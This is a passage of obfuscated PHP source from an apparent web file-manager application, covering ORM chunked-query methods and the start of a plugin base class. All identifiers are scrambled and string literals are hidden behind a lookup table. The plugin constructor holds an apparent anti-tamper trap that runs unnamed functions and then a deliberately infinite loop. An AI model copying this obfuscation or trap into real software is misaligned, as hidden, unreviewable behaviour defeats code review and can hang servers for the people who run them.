$this->optionsValue($¥×ÆÛ–); $òÂ‚˜ï  = $this->page($º†¿”úé, $¾´ÓĞõ¢)->select(); } if (!is_array($òÂ‚˜ï )) { $òÂ‚˜ï  = array(); } if ($ŒÊä¶³û == 1) { $òÉë¸‹Ê = count($òÂ‚˜ï ); } $Åä…èŞó = array($¨à¿Ù±ñ[444] => array($¨à¿Ù±ñ[445] => $òÉë¸‹Ê, $¨à¿Ù±ñ[441] => $¾´ÓĞõ¢, $¨à¿Ù±ñ[430] => $º†¿”úé, $¨à¿Ù±ñ[446] => $ŒÊä¶³û), $¨à¿Ù±ñ[447] => $òÂ‚˜ï ); return $Åä…èŞó; } protected function checkLength($¦™«Õ’Ú, $ÍÊõ€€à = 0, $ı”®¼ˆÆ = '') { $Î£È…´ =& $_SERVER[±Ö‰ô½¯]; $ÍÊõ€€à = $ÍÊõ€€à ? $ÍÊõ€€à : 65536; if (!$¦™«Õ’Ú || strlen($¦™«Õ’Ú) < $ÍÊõ€€à) { return; } $ı”®¼ˆÆ = $ı”®¼ˆÆ ? $ı”®¼ˆÆ . $Î£È…´[74] : $Î£È…´[12]; show_json($ı”®¼ˆÆ . LNG($Î£È…´[448]) . "\50{$ÍÊõ€€à}\x29", !1); } protected function metaSet($ÏÕèƒ·ü, $œÊ‘Ø´à = null, $İ“»Ü¿ = null) { $µê¦ÜØÚ =& $_SERVER[±Ö‰ô½¯]; if (!$this->tableMeta || !$ÏÕèƒ·ü) { return !1; } $‹æòé¥ö = $this->tableMeta[$µê¦ÜØÚ[449]]; $ô–÷à‹¾ = $this->tableMeta[$µê¦ÜØÚ[450]]; $ºóŒı¥¼ = Model($ô–÷à‹¾); $ù¥‚‰Õó = array($‹æòé¥ö => $ÏÕèƒ·ü, $µê¦ÜØÚ[451] => $œÊ‘Ø´à); if (is_null($œÊ‘Ø´à)) { return $ºóŒı¥¼->where(array($‹æòé¥ö => $ÏÕèƒ·ü))->delete(); } if (is_null($İ“»Ü¿) && is_string($œÊ‘Ø´à)) { return $ºóŒı¥¼->where($ù¥‚‰Õó)->delete(); } $‹ø“éÃ„ = is_array($œÊ‘Ø´à) ? $œÊ‘Ø´à : array(); if (is_string($œÊ‘Ø´à)) { $‹ø“éÃ„[$œÊ‘Ø´à] = $İ“»Ü¿; } $’©ß™êÑ = array(); foreach ($‹ø“éÃ„ as $€ ò£ªè => $§·â¼·‡) { if (is_null($§·â¼·‡) && is_string($€ ò£ªè)) { $ºóŒı¥¼->where(array($‹æòé¥ö => $ÏÕèƒ·ü, $µê¦ÜØÚ[451] => $€ ò£ªè))->delete(); continue; } $this->checkLength($§·â¼·‡, !1, $ô–÷à‹¾ . $µê¦ÜØÚ[4] . $€ ò£ªè); $’©ß™êÑ[] = array($‹æòé¥ö => $ÏÕèƒ·ü, $µê¦ÜØÚ[95] => $€ ò£ªè, $µê¦ÜØÚ[452] => $§·â¼·‡); } $¶Â‡šø = $µê¦ÜØÚ[453] . $ô–÷à‹¾; CacheLock::lock($¶Â‡šø); $ºóŒı¥¼->where(array($‹æòé¥ö => $ÏÕèƒ·ü))->addAll($’©ß™êÑ, array(), !0); CacheLock::unlock($¶Â‡šø); return !0; } public function metaGet($íÑõâˆ, $àˆÌ×·’ = false) { $ª íäÁ³ =& $_SERVER[±Ö‰ô½¯]; if (!$this->tableMeta) { return array(); } $šÒ¥ø’Î = $this->tableMeta[$ª íäÁ³[449]]; $„”§µÜü = Model($this->tableMeta[$ª íäÁ³[450]]); if ($àˆÌ×·’) { $×ïĞ¥®‘ = array($šÒ¥ø’Î => $íÑõâˆ, $ª íäÁ³[95] => $àˆÌ×·’); return $„”§µÜü->where($×ïĞ¥®‘)->getField($ª íäÁ³[452]); } $×ïĞ¥®‘ = array($šÒ¥ø’Î => $íÑõâˆ); $ïÌµ×Œê = $„”§µÜü->field($ª íäÁ³[454])->where($×ïĞ¥®‘)->select(); $ïÌµ×Œê = array_to_keyvalue($ïÌµ×Œê, $ª íäÁ³[95], $ª íäÁ³[452]); return $ïÌµ×Œê; } private function checkDataAutoHas($ÎÄòÆÙ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ù±’‚ñÁ) { if (in_array($ÎÄòÆÙ, explode($_SERVER[±Ö‰ô½¯][50], $ù±’‚ñÁ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$´Êò–ùì, $¯·Ú·Ÿ) { $âèÅï“– =& $_SERVER[±Ö‰ô½¯]; if (!is_array($´Êò–ùì)) { return; } foreach ($this->dataAuto as $Ä‡¥–àÊ) { $Í“İÜØ = $Ä‡¥–àÊ[0]; if (!in_array($¯·Ú·Ÿ, explode($âèÅï“–[50], $Ä‡¥–àÊ[2]))) { continue; } switch (trim($Ä‡¥–àÊ[3])) { case $âèÅï“–[398]: case $âèÅï“–[399]: $èâùÑí = $Ä‡¥–àÊ[1]; $„µ·éŠ = isset($Ä‡¥–àÊ[4]) ? (array) $Ä‡¥–àÊ[4] : array(); if ($èâùÑí == $âèÅï“–[206] && array_key_exists($Í“İÜØ, $´Êò–ùì)) { if (!$´Êò–ùì[$Í“İÜØ]) { unset($´Êò–ùì[$Í“İÜØ]); } break; } if (isset($´Êò–ùì[$Í“İÜØ])) { array_unshift($„µ·éŠ, $´Êò–ùì[$Í“İÜØ]); } if ($âèÅï“–[398] == $Ä‡¥–àÊ[3]) { $´Êò–ùì[$Í“İÜØ] = call_user_func_array($èâùÑí, $„µ·éŠ); } else { $´Êò–ùì[$Í“İÜØ] = call_user_func_array(array(&$this, $èâùÑí), $„µ·éŠ); } break; case $âèÅï“–[350]: if (isset($´Êò–ùì[$Í“İÜØ]) && $´Êò–ùì[$Í“İÜØ]) { $´Êò–ùì[$Í“İÜØ] = call_user_func_array(array(&$this, $Ä‡¥–àÊ[1]), array($´Êò–ùì[$Í“İÜØ])); } break; case $âèÅï“–[353]: $´Êò–ùì[$Í“İÜØ] = $´Êò–ùì[$Ä‡¥–àÊ[1]]; break; case $âèÅï“–[371]: if (isset($´Êò–ùì[$Í“İÜØ]) && !is_string($´Êò–ùì[$Í“İÜØ])) { $´Êò–ùì[$Í“İÜØ] = json_encode_force($´Êò–ùì[$Í“İÜØ]); $´Êò–ùì[$Í“İÜØ] = self::textEncode($´Êò–ùì[$Í“İÜØ]); } break; case $âèÅï“–[400]: if ($´Êò–ùì[$Í“İÜØ] === $âèÅï“–[12]) { unset($´Êò–ùì[$Í“İÜØ]); } break; case $âèÅï“–[401]: $´Êò–ùì[$Í“İÜØ] = $Ä‡¥–àÊ[1]; default: break; } } if ($¯·Ú·Ÿ == $âèÅï“–[432]) { $ËÂ¤ÏĞÄ = strtolower($this->db->getDbType()); if (strpos($ËÂ¤ÏĞÄ, $âèÅï“–[13]) !== 0) { return; } $ğÌ‡ºŒİ = $this->field(!0)->fields; $–éºšâ‹ = $ğÌ‡ºŒİ[$âèÅï“–[331]]; if (isset($ğÌ‡ºŒİ[$âèÅï“–[330]])) { unset($–éºšâ‹[$ğÌ‡ºŒİ[$âèÅï“–[330]]]); } foreach ($–éºšâ‹ as $ûœâ¾™¦ => $¯·Ú·Ÿ) { if (!isset($´Êò–ùì[$ûœâ¾™¦])) { $´Êò–ùì[$ûœâ¾™¦] = $âèÅï“–[12]; } } } } private function dataAfterFilter(&$ì‹–²„õ) { $ŒÒÜ˜àÕ =& $_SERVER[±Ö‰ô½¯]; foreach ($this->dataAuto as $ãÄ„ƒ¼˜) { $µ•ûÌ™ = $ãÄ„ƒ¼˜[0]; if (!isset($ì‹–²„õ[$µ•ûÌ™])) { continue; } if (!in_array($ŒÒÜ˜àÕ[434], explode($ŒÒÜ˜àÕ[50], $ãÄ„ƒ¼˜[2]))) { continue; } switch (trim($ãÄ„ƒ¼˜[3])) { case $ŒÒÜ˜àÕ[398]: case $ŒÒÜ˜àÕ[399]: $âğÈŒ® = isset($ãÄ„ƒ¼˜[4]) ? (array) $ãÄ„ƒ¼˜[4] : array(); array_unshift($âğÈŒ®, $ì‹–²„õ[$µ•ûÌ™]); if (isset($ãÄ„ƒ¼˜[4]) && $ãÄ„ƒ¼˜[4] == $ŒÒÜ˜àÕ[455]) { $âğÈŒ® = array($ì‹–²„õ[$µ•ûÌ™]); } if ($ŒÒÜ˜àÕ[398] == $ãÄ„ƒ¼˜[3]) { $ì‹–²„õ[$µ•ûÌ™] = call_user_func_array($ãÄ„ƒ¼˜[1], $âğÈŒ®); } else { $ì‹–²„õ[$µ•ûÌ™] = call_user_func_array(array(&$this, $ãÄ„ƒ¼˜[1]), $âğÈŒ®); } break; case $ŒÒÜ˜àÕ[350]: if (isset($ì‹–²„õ[$µ•ûÌ™]) && $ì‹–²„õ[$µ•ûÌ™]) { $ì‹–²„õ[$µ•ûÌ™] = call_user_func_array(array(&$this, $ãÄ„ƒ¼˜[1]), array($ì‹–²„õ[$µ•ûÌ™])); } break; case $ŒÒÜ˜àÕ[353]: $ì‹–²„õ[$µ•ûÌ™] = $ì‹–²„õ[$ãÄ„ƒ¼˜[1]]; break; case $ŒÒÜ˜àÕ[371]: $û¯ÇğÛÓ = $ì‹–²„õ[$µ•ûÌ™]; $û¯ÇğÛÓ = self::textDecode($û¯ÇğÛÓ); $ì‹–²„õ[$µ•ûÌ™] = json_decode($û¯ÇğÛÓ, !0); if (is_null($ì‹–²„õ[$µ•ûÌ™])) { $ì‹–²„õ[$µ•ûÌ™] = $û¯ÇğÛÓ; } break; case $ŒÒÜ˜àÕ[400]: if ($ì‹–²„õ[$µ•ûÌ™] === $ŒÒÜ˜àÕ[12]) { unset($ì‹–²„õ[$µ•ûÌ™]); } break; case $ŒÒÜ˜àÕ[401]: $ì‹–²„õ[$µ•ûÌ™] = $ãÄ„ƒ¼˜[1]; break; default: break; } } } public function saveAll($²È’ØŞ, $ÌÈ«‹ƒĞ = false) { $ÙéÈı‰İ =& $_SERVER[±Ö‰ô½¯]; $ÀÓè·§Ô = $this->db; $óƒË‡ˆ = $this->tablePrefix . $this->tableName; $—â”°ÌÚ = $this->saveAllChunkMake($²È’ØŞ); $ÌÈ«‹ƒĞ = is_array($ÌÈ«‹ƒĞ) ? $ÌÈ«‹ƒĞ : array(); foreach ($—â”°ÌÚ as $å¶ğóÍì) { $‚‘È¨ÖÒ = $ÙéÈı‰İ[12]; $ş¦ò‘ƒë = $ÙéÈı‰İ[12]; $îÛ…§÷Æ = array(); $ÆÆ–µØ = array(); foreach ($å¶ğóÍì as $®’íÉòù => $ÛÄ‡à§) { $‚‘È¨ÖÒ = $ÛÄ‡à§[$ÙéÈı‰İ[456]]; $ÆÆ–µØ[] = $ÛÄ‡à§[$ÙéÈı‰İ[457]]; $åŒß€å = $ÀÓè·§Ô->parseValue($ÛÄ‡à§[$ÙéÈı‰İ[457]]); foreach ($ÛÄ‡à§[$ÙéÈı‰İ[458]] as $œÍ§ûÃÕ => $ÄŒ¸åØ) { if (!$îÛ…§÷Æ[$œÍ§ûÃÕ]) { $îÛ…§÷Æ[$œÍ§ûÃÕ] = array(); } $îÛ…§÷Æ[$œÍ§ûÃÕ][] = $ÙéÈı‰İ[459] . $åŒß€å . $ÙéÈı‰İ[460] . $ÀÓè·§Ô->parseValue($ÄŒ¸åØ); } } $Í„‹‚ß× = $‚‘È¨ÖÒ; $Í„‹‚ß× = $ÀÓè·§Ô->parseKey($Í„‹‚ß×); foreach ($îÛ…§÷Æ as $œÍ§ûÃÕ => $¸è„æ‘Õ) { $ş¦ò‘ƒë .= $ÙéÈı‰İ[287] . $ÀÓè·§Ô->parseKey($œÍ§ûÃÕ) . $ÙéÈı‰İ[461] . $Í„‹‚ß× . $ÙéÈı‰İ[462]; $ş¦ò‘ƒë .= implode($ÙéÈı‰İ[287], $¸è„æ‘Õ) . $ÙéÈı‰İ[463]; } $şÙ—”„ = $ÌÈ«‹ƒĞ; $şÙ—”„[$‚‘È¨ÖÒ] = array($ÙéÈı‰İ[7], $ÆÆ–µØ); $à“Ã„£¤ = "\x55\120\x44\x41\x54\x45\40\x60{$óƒË‡ˆ}\x60\x20\x53\105\124\x20" . rtrim($ş¦ò‘ƒë, $ÙéÈı‰İ[50]) . $ÙéÈı‰İ[287] . $ÀÓè·§Ô->parseWhere($şÙ—”„); $this->execute($à“Ã„£¤); $this->chunkEventCheck(count($å¶ğóÍì)); } $this->chunkEventSet(); } public function saveAllEach($Š™ÑİÒ¦, $ÎÜ—„¹ = false) { $íÈøà‚ =& $_SERVER[±Ö‰ô½¯]; $ÄùÀ’ß = $this->db; $—Õ’óÕ = $this->tablePrefix . $this->tableName; $†Ã½ëªŒ = $this->saveAllChunkMake($Š™ÑİÒ¦); $ÎÜ—„¹ = is_array($ÎÜ—„¹) ? $ÎÜ—„¹ : array(); foreach ($†Ã½ëªŒ as $ÑÕ£Ç½) { foreach ($ÑÕ£Ç½ as $ÕºÓ‹óé => $ºß‹¥‚÷) { $ÜïÅ¸ÅÚ = $íÈøà‚[464]; foreach ($ºß‹¥‚÷[$íÈøà‚[458]] as $øê€Ä³ => $æüÀšÓ­) { $ÜïÅ¸ÅÚ .= $ÄùÀ’ß->parseKey($øê€Ä³) . $íÈøà‚[465] . $ÄùÀ’ß->parseValue($æüÀšÓ­) . $íÈøà‚[50]; } $ƒº•ƒ¤„ = $ÎÜ—„¹; $ƒº•ƒ¤„[$ºß‹¥‚÷[$íÈøà‚[456]]] = $ºß‹¥‚÷[$íÈøà‚[457]]; $®‡Õó = "\x55\x50\x44\101\124\x45\40\140{$—Õ’óÕ}\x60\x20\x53\x45\x54\40" . rtrim($ÜïÅ¸ÅÚ, $íÈøà‚[50]) . $íÈøà‚[466] . $ÄùÀ’ß->parseWhere($ƒº•ƒ¤„) . $íÈøà‚[467]; $this->execute($®‡Õó); } $this->chunkEventCheck(count($ÑÕ£Ç½)); } $this->chunkEventSet(); } private function saveAllChunkMake($ßğĞÏ¨Ó) { $ÈÔŸÆàï =& $_SERVER[±Ö‰ô½¯]; $û‹ÅêøÕ = self::SQL_WHERE_IN_CHUNK; $ßğĞÏ¨Ó = is_array($ßğĞÏ¨Ó) ? $ßğĞÏ¨Ó : array(); $—§¿Öİá = array(); $ò÷ßúì = ceil(count($ßğĞÏ¨Ó) / $û‹ÅêøÕ); for ($™şßôË¥ = 0; $™şßôË¥ < $ò÷ßúì; $™şßôË¥++) { $‹ÁÃƒú‚ = array(); $Â ô¦ş = array_slice($ßğĞÏ¨Ó, $™şßôË¥ * $û‹ÅêøÕ, $û‹ÅêøÕ); foreach ($Â ô¦ş as $‚àÒÍìò) { if (!is_array($‚àÒÍìò) || count($‚àÒÍìò) < 4 || count($‚àÒÍìò) % 2 != 0) { continue; } $şÃø‚êè = array(); for ($’òüşÜí = 2; $’òüşÜí < count($‚àÒÍìò); $’òüşÜí += 2) { $şÃø‚êè[$‚àÒÍìò[$’òüşÜí]] = $‚àÒÍìò[$’òüşÜí + 1]; } $‹ÁÃƒú‚[] = array($ÈÔŸÆàï[456] => $‚àÒÍìò[0], $ÈÔŸÆàï[457] => $‚àÒÍìò[1], $ÈÔŸÆàï[458] => $şÃø‚êè); } $—§¿Öİá[] = $‹ÁÃƒú‚; } return $—§¿Öİá; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‹«Ê½“ã = false, $î†ûÒÎ™ = false) { $this->_chunkEvent = $‹«Ê½“ã; $this->_chunkEventParam = $î†ûÒÎ™; } private function chunkEventCheck($É¦±Ïî) { if (!$this->_chunkEvent) { return; } $ŠÁ¿êØ¥ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŠÁ¿êØ¥[$_SERVER[±Ö‰ô½¯][468]] = $É¦±Ïî; Hook::trigger($this->_chunkEvent, $ŠÁ¿êØ¥); } public function addAll($³ÓáåË, $¦¿¯ß—‘ = array(), $„¬©è‚Ç = false) { $ÄûºƒÖŒ =& $_SERVER[±Ö‰ô½¯]; ignore_timeout(); $¯’èÜå = self::SQL_WHERE_IN_CHUNK; if (empty($³ÓáåË)) { $this->error = think_lang($ÄûºƒÖŒ[351]); return !1; } $¦¿¯ß—‘ = $this->_parseOptions($¦¿¯ß—‘); foreach ($³ÓáåË as $¾ØçòşÒ => $Ê³‚¡ª¢) { $³ÓáåË[$¾ØçòşÒ] = $this->_facade($Ê³‚¡ª¢); $this->_beforeInsert($³ÓáåË[$¾ØçòşÒ], $¦¿¯ß—‘); } if (method_exists($this->db, $ÄûºƒÖŒ[352])) { for ($·é™‘ÑÃ = 0; $·é™‘ÑÃ < count($³ÓáåË); $·é™‘ÑÃ += $¯’èÜå) { $ÓëõøØ = array_slice($³ÓáåË, $·é™‘ÑÃ, $¯’èÜå); if (!is_array($ÓëõøØ) || count($ÓëõøØ) == 0) { break; } $ôî’«Üµ = $this->db->insertAll($ÓëõøØ, $¦¿¯ß—‘, $„¬©è‚Ç); $this->chunkEventCheck(count($ÓëõøØ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($³ÓáåË as $¾ØçòşÒ => $Ê³‚¡ª¢) { $ôî’«Üµ = $this->db->insert($Ê³‚¡ª¢, $¦¿¯ß—‘, $„¬©è‚Ç); } $this->commit(); } if (!1 !== $ôî’«Üµ) { $Ç®êİ°… = $this->getLastInsID(); if ($Ç®êİ°…) { return $Ç®êİ°…; } } return $ôî’«Üµ; } public function save($¢öé«×Î = '', $Å°éô½ = array()) { $Ï—í†Â =& $_SERVER[±Ö‰ô½¯]; $ÔöÇÒÔê = self::SQL_WHERE_IN_CHUNK; $ªıÍè“½ = $this->optionsValue(); $û¿°ğ¢ = $this->findWhereField($ªıÍè“½); if (!$û¿°ğ¢) { return parent::save($¢öé«×Î, $Å°éô½); } $Ñ×ö¾¶â = 0; $™ïÕ = $ªıÍè“½[$Ï—í†Â[355]][$û¿°ğ¢][1]; $™ïÕ = is_array($™ïÕ) ? $™ïÕ : array(); $°­†¶…ô = count($™ïÕ); for ($”Ê¹á“œ = 0; $”Ê¹á“œ < $°­†¶…ô; $”Ê¹á“œ += $ÔöÇÒÔê) { $ñ–—ò¸´ = array_slice($™ïÕ, $”Ê¹á“œ, $ÔöÇÒÔê); if (!is_array($ñ–—ò¸´) || count($ñ–—ò¸´) == 0) { break; } $ªıÍè“½[$Ï—í†Â[355]][$û¿°ğ¢][1] = $ñ–—ò¸´; $this->optionsValue($ªıÍè“½); $Ñ×ö¾¶â += parent::save($¢öé«×Î, $Å°éô½); $this->chunkEventCheck(count($ñ–—ò¸´)); } $this->chunkEventSet(); return $Ñ×ö¾¶â; } public function add($½é™è°Š = '', $£Ü±±Æ = array(), $”ÆãÒúú = false) { if ($this->addTaskStatus && is_array($½é™è°Š)) { $this->addTaskData[] = $½é™è°Š; return; } return parent::add($½é™è°Š, $£Ü±±Æ, $”ÆãÒúú); } public function parseWhereLike($ƒÒ“šö¦, $ç÷¤ª†Ë = '', $´Ì®€ª˜ = false, &$ÅøÚ›ãä = false) { $‡¶âéã° =& $_SERVER[±Ö‰ô½¯]; $Ê¬àˆ = $GLOBALS[$‡¶âéã°[6]][$‡¶âéã°[469]]; if (!$Ê¬àˆ[$‡¶âéã°[470]]) { return $ƒÒ“šö¦; } if (!is_array($ƒÒ“šö¦)) { return $ƒÒ“šö¦; } $—™¨åÌ¶ = array(); $¹àÜĞ£° = 0; foreach ($ƒÒ“šö¦ as $Öê¬„Û => $–ÛáÙ) { if (is_array($–ÛáÙ) && count($–ÛáÙ) == 2 && $–ÛáÙ[0] == $‡¶âéã°[471] && is_string($–ÛáÙ[1]) && substr($–ÛáÙ[1], 0, 1) == $‡¶âéã°[472] && substr($–ÛáÙ[1], strlen($–ÛáÙ[1]) - 1, 1) == $‡¶âéã°[472]) { $ÅøÚ›ãä = !0; $à”Î¦Ìˆ = is_string($Öê¬„Û) ? $Öê¬„Û : $ç÷¤ª†Ë; $ÂÙ§ê‚ = substr($–ÛáÙ[1], 1, strlen($–ÛáÙ[1]) - 2); $ÂÙ§ê‚ = $this->db->escapeString($ÂÙ§ê‚); if (!strpos($à”Î¦Ìˆ, $‡¶âéã°[10])) { $à”Î¦Ìˆ = $‡¶âéã°[473] . $à”Î¦Ìˆ . $‡¶âéã°[473]; } $çÍ ¤ë¸ = $‡¶âéã°[222] . $ÂÙ§ê‚ . $‡¶âéã°[222]; $ÂÙ§ê‚ = str_replace(array($‡¶âéã°[10], $‡¶âéã°[474], $‡¶âéã°[11]), $‡¶âéã°[475], $ÂÙ§ê‚); if ($Ê¬àˆ[$‡¶âéã°[476]]) { $çÍ ¤ë¸ = $‡¶âéã°[477] . $ÂÙ§ê‚ . $‡¶âéã°[478]; if ($Ê¬àˆ[$‡¶âéã°[479]]) { $çÍ ¤ë¸ = $‡¶âéã°[478] . $ÂÙ§ê‚ . $‡¶âéã°[477]; } } $—™¨åÌ¶[$¹àÜĞ£°] = $‡¶âéã°[480] . $à”Î¦Ìˆ . $‡¶âéã°[481] . $çÍ ¤ë¸ . $‡¶âéã°[482]; $¹àÜĞ£°++; continue; } if (is_array($–ÛáÙ)) { $ç÷¤ª†Ë = is_string($Öê¬„Û) ? $Öê¬„Û : $ç÷¤ª†Ë; $–ÛáÙ = $this->parseWhereLike($–ÛáÙ, $ç÷¤ª†Ë, !0, $ÅøÚ›ãä); } if (is_numeric($Öê¬„Û)) { $—™¨åÌ¶[$¹àÜĞ£°] = $–ÛáÙ; $¹àÜĞ£°++; } else { $—™¨åÌ¶[$Öê¬„Û] = $–ÛáÙ; } } if ($ÅøÚ›ãä && !$´Ì®€ª˜) { } return $—™¨åÌ¶; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($™‰†‰ÈŞ = array()) { $‡³‚êìÈ =& $_SERVER[±Ö‰ô½¯]; $î’îì´ö = self::SQL_WHERE_IN_CHUNK; $èÌ¡–ØÑ = $this->optionsValue(); $çç•‰¾ = $this->findWhereField($èÌ¡–ØÑ); if (!$çç•‰¾ || isset($èÌ¡–ØÑ[$‡³‚êìÈ[370]]) || isset($èÌ¡–ØÑ[$‡³‚êìÈ[430]])) { return parent::select($™‰†‰ÈŞ); } $†ñöïôĞ = $èÌ¡–ØÑ[$‡³‚êìÈ[355]][$çç•‰¾][1]; $†ñöïôĞ = is_array($†ñöïôĞ) ? $†ñöïôĞ : array(); $¾èÚë¾Ö = null; for ($‘¦¦€ê = 0; $‘¦¦€ê < count($†ñöïôĞ); $‘¦¦€ê += $î’îì´ö) { $Éæ¿ùÚ½ = array_slice($†ñöïôĞ, $‘¦¦€ê, $î’îì´ö); if (!is_array($Éæ¿ùÚ½) || count($Éæ¿ùÚ½) == 0) { break; } $èÌ¡–ØÑ[$‡³‚êìÈ[355]][$çç•‰¾][1] = $Éæ¿ùÚ½; $this->optionsValue($èÌ¡–ØÑ); $ÀÀæØú  = parent::select($™‰†‰ÈŞ); if (!$ÀÀæØú ) { continue; } $¾èÚë¾Ö = is_array($¾èÚë¾Ö) ? $¾èÚë¾Ö : array(); $¾èÚë¾Ö = array_merge($¾èÚë¾Ö, $ÀÀæØú ); } return $¾èÚë¾Ö; } public function delete($¯˜á¬ğà = array()) { $ùÉÑ«Æ„ =& $_SERVER[±Ö‰ô½¯]; $…í›¸º = self::SQL_WHERE_IN_CHUNK; $Ìºê…åÎ = $this->optionsValue(); $Ù³ƒ¯¢˜ = $this->findWhereField($Ìºê…åÎ); if (!$Ù³ƒ¯¢˜) { return parent::delete($¯˜á¬ğà); } $Ÿ…³ø„´ = 0; $ÃŞ ô˜ = $Ìºê…åÎ[$ùÉÑ«Æ„[355]][$Ù³ƒ¯¢˜][1]; $ÃŞ ô˜ = is_array($ÃŞ ô˜) ? $ÃŞ ô˜ : array(); for ($™ü”Ş™ = 0; $™ü”Ş™ < count($ÃŞ ô˜); $™ü”Ş™ += $…í›¸º) { $…Ò… Ú = array_slice($ÃŞ ô˜, $™ü”Ş™, $…í›¸º); if (!is_array($…Ò… Ú) || count($…Ò… Ú) == 0) { break; } $Ìºê…åÎ[$ùÉÑ«Æ„[355]][$Ù³ƒ¯¢˜][1] = $…Ò… Ú; $this->optionsValue($Ìºê…åÎ); $Ÿ…³ø„´ += parent::delete($¯˜á¬ğà); } return $Ÿ…³ø„´; } private function findWhereField($ŸƒøÑ¸) { $ù”ËÖ°í =& $_SERVER[±Ö‰ô½¯]; $‘Ò£¯üƒ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ŸƒøÑ¸) || !is_array($ŸƒøÑ¸[$ù”ËÖ°í[355]])) { return !1; } foreach ($ŸƒøÑ¸[$ù”ËÖ°í[355]] as $ñ—î¾æ“ => $î×£ëÈ¹) { if (is_array($î×£ëÈ¹) && isset($î×£ëÈ¹[0]) && is_string($î×£ëÈ¹[0]) && strtolower($î×£ëÈ¹[0]) == $ù”ËÖ°í[7] && is_array($î×£ëÈ¹[1]) && count($î×£ëÈ¹[1]) > $‘Ò£¯üƒ) { ignore_timeout(); return $ñ—î¾æ“; } } return !1; } public function setMasterDB($Åô†Ò–ç = true) { think_config($_SERVER[±Ö‰ô½¯][483], $Åô†Ò–ç); } } goto d„³Šà³œ; dÔß›±æÀƒ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¡ÛšŒ¿ =& $_SERVER[±Ö‰ô½¯]; if (!isset($_SERVER[$¡ÛšŒ¿[986]]) || !isset($_SERVER[$¡ÛšŒ¿[1699]])) { $­êú…Óú = $¡ÛšŒ¿[988]; $§ÇÆ‡·  = $¡ÛšŒ¿[989]; $¿È¸ğé = $_SERVER[$¡ÛšŒ¿[990]] . $¡ÛšŒ¿[991]; $İò›Ó—„ = $§ÇÆ‡· ($¿È¸ğé); $ß—ŞÛÄ = explode($¡ÛšŒ¿[287], $İò›Ó—„); if (count($ß—ŞÛÄ) < $¡ÛšŒ¿[717]) { $ÈÎ ’¥– = $¡ÛšŒ¿[992]; $ÈÎ ’¥–(); } $ĞçöîÒá = $¡ÛšŒ¿[993]; $ĞçöîÒá($_SERVER[$¡ÛšŒ¿[994]]); $Œ÷Ûâï¡ = 1; for ($áÒ¦”Í = $Œ÷Ûâï¡; $áÒ¦”Í > 0; $áÒ¦”Í++) { $ĞçöîÒá = json_encode($GLOBALS[$¡ÛšŒ¿[504]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¡ÛšŒ¿[1779]); $this->pluginName = str_replace($¡ÛšŒ¿[1779], $¡ÛšŒ¿[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¡ÛšŒ¿[8]; $this->pluginApi = appHostGet() . $¡ÛšŒ¿[1780] . $this->pluginName . $¡ÛšŒ¿[8]; $this->pluginHost = $config[$¡ÛšŒ¿[1781]] . $this->pluginName . $¡ÛšŒ¿[8]; $this->pluginHostDefault = $config[$¡ÛšŒ¿[1781]] . $this->pluginName . $¡ÛšŒ¿[8]; $µ Ê…Ç‘ = $config[$¡ÛšŒ¿[1782]]; if ($µ Ê…Ç‘ && strpos($¡ÛšŒ¿[50] . $µ Ê…Ç‘ . $¡ÛšŒ¿[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¡ÛšŒ¿[1783]] . $this->pluginName . $¡ÛšŒ¿[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[±Ö‰ô½¯][1784]); } protected function assign($Ğİã•Ä, $çø™°İƒ = false) { if (is_array($Ğİã•Ä)) { $this->values = array_merge($this->values, $Ğİã•Ä); } else { $this->values[$Ğİã•Ä] = $çø™°İƒ; } } protected function display($’Á„ààÎ) { extract($this->values); require $’Á„ààÎ; } final function hookRegist($“—¹“ìû) { $this->modelPlugin->appRegist($this->pluginName, $“—¹“ìû); } final function appIcon() { $¶Ó½úâ‡ =& $_SERVER[±Ö‰ô½¯]; $‡¹ÊÙÆñ = $this->appPackage(); $åç€šÌª = $¶Ó½úâ‡[12]; if (isset($‡¹ÊÙÆñ[$¶Ó½úâ‡[502]])) { if (isset($‡¹ÊÙÆñ[$¶Ó½úâ‡[502]][$¶Ó½úâ‡[1785]])) { $åç€šÌª = $¶Ó½úâ‡[1786] . $‡¹ÊÙÆñ[$¶Ó½úâ‡[502]][$¶Ó½úâ‡[1785]] . $¶Ó½úâ‡[1787]; } else { if ($‡¹ÊÙÆñ[$¶Ó½úâ‡[502]][$¶Ó½úâ‡[1788]]) { $åç€šÌª = $¶Ó½úâ‡[1789] . $‡¹ÊÙÆñ[$¶Ó½úâ‡[502]][$¶Ó½úâ‡[1788]] . $¶Ó½úâ‡[1790]; } } } return $åç€šÌª; } final function fileCanView($Œ¾ôøÂ) { $ª¥âõÎ =& $_SERVER[±Ö‰ô½¯]; if (request_url_safe($Œ¾ôøÂ)) { return !0; } if ($this->isShare($Œ¾ôøÂ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ìşúéü = $ª¥âõÎ[1791] . rawurlencode(this_url()); show_tips(LNG($ª¥âõÎ[1792]) . $ª¥âõÎ[1793] . $ìşúéü . $ª¥âõÎ[1794] . LNG($ª¥âõÎ[1795]) . $ª¥âõÎ[1796], !1); } if (!Action($ª¥âõÎ[1797])->authCan($ª¥âõÎ[1798])) { show_tips(LNG($ª¥âõÎ[1799]) . $ª¥âõÎ[1800], !1); } 